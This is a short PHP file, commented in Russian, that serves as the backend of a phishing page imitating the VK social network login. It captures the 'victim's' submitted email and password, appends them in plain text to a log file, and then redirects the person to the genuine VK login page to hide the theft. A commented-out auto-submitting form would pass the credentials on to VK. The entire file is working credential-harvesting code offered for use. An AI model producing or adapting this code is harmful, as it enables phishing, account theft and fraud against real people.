<?php
   if (isset($_POST)) {          // Проверяем пришел ли запрос с данными жертвы
    $login = $_POST['email'];
    $password = $_POST['pass'];
    $fw = fopen('post.log', "a+");
    $log = 'Логин: ' . $login . "\n" . 'Пароль: ' . $password . "\n";
    fwrite($fw, $log);           // Записываем полученные данные в файл
    fclose($fw);                 // Закрываем файл
    header('location: https://login.vk.com/?act=login&to=c3NzdGlja2Vyc3Zr&_origin=https://m.vk.com&ip_h=795e3e47189dfb4fcf&lg_h=6b8097b365d316a07f&role=pda&utf8=1');
}   // Переадрессовываем жертву ↑↑
?>

<!--<form method="post" class="form1" action="https://login.vk.com/?act=login&to=c3NzdGlja2Vyc3Zr&_origin=https://m.vk.com&ip_h=795e3e47189dfb4fcf&lg_h=6b8097b365d316a07f&role=pda&utf8=1">
    <input name="email" type="text" class="textfield" value="<//?php echo $login ?>"></input>
    <input name="pass" type="password" class="textfield" value="<//?php echo $password ?>"></input>
</form>

<script>
    let form1 = document.querySelector(".form1");
    window.onload = function() {
        form1.submit();
    }
</script>-->